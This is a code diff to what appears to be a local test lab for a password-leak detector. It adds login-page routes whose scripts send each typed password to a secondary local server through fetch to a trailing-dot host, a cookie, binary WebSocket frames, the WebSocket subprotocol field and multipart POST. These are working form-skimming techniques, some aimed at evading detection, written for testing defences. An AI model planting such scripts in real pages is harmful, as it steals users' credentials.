@@ -140,12 +140,52 @@ export const CONTROL_LAB_ROUTES = Object.freeze({
       fetch('${secondary}/header-receive', { headers: { 'x-tv-leak': this.value } }).catch(() => {});
     });
   </script>`,
+  '/trailing-dot-leak': ({ secondary }) => {
+    const target = new URL(secondary);
+    target.hostname = 'localhost.';
+    return `${loginForm()}<script>
+      document.querySelector('#password').addEventListener('input', function () {
+        fetch('${target.origin}/trailing-dot-receive', {
+          method: 'POST', headers: { 'x-tv-leak': this.value }, body: this.value
+        }).catch(() => {});
+      });
+    </script>`;
+  },
+  '/cookie-header-leak': () => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      document.cookie = 'c=' + encodeURIComponent(this.value) + '; SameSite=Lax';
+      fetch('/cookie-receive').catch(() => {});
+    });
+  </script>`,
   '/ws-leak': ({ secondary }) => `${loginForm()}<script>
     var socket = new WebSocket('${secondary.replace('http:', 'ws:')}/ws-receive');
     document.querySelector('#password').addEventListener('input', function () {
       var value = this.value;
       if (socket.readyState === WebSocket.OPEN) socket.send(value);
       else socket.addEventListener('open', () => socket.send(value), { once: true });
+    });
+  </script>`,
+  '/ws-binary-leak': ({ secondary }) => `${loginForm()}<script>
+    var socket = new WebSocket('${secondary.replace('http:', 'ws:')}/ws-binary-receive');
+    document.querySelector('#password').addEventListener('input', function () {
+      var value = new TextEncoder().encode(this.value);
+      var payload = new Uint8Array(value.length + 1);
+      payload[0] = 255;
+      payload.set(value, 1);
+      if (socket.readyState === WebSocket.OPEN) socket.send(payload);
+      else socket.addEventListener('open', () => socket.send(payload), { once: true });
+    });
+  </script>`,
+  '/ws-protocol-leak': ({ secondary }) => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      new WebSocket('${secondary.replace('http:', 'ws:')}/ws-protocol-receive', this.value);
+    });
+  </script>`,
+  '/multipart-text-leak': ({ secondary }) => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      var data = new FormData();
+      data.append('text', this.value);
+      fetch('${secondary}/multipart-text-receive', { method: 'POST', body: data }).catch(() => {});
     });
   </script>`,
 } satisfies Record<string, Route>);
@@ -231,11 +271,13 @@ function attachWebSocketServer(server: Server, requests: LabRequest[]): void {
     const accept = createHash('sha1')
       .update(`${key}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`)
       .digest('base64');
+    const protocol = request.headers['sec-websocket-protocol'];
     socket.write([
       'HTTP/1.1 101 Switching Protocols',
       'Upgrade: websocket',
       'Connection: Upgrade',
       `Sec-WebSocket-Accept: ${accept}`,
+      ...(typeof protocol === 'string' ? [`Sec-WebSocket-Protocol: ${protocol}`] : []),
       '',
       '',
     ].join('\r\n'));
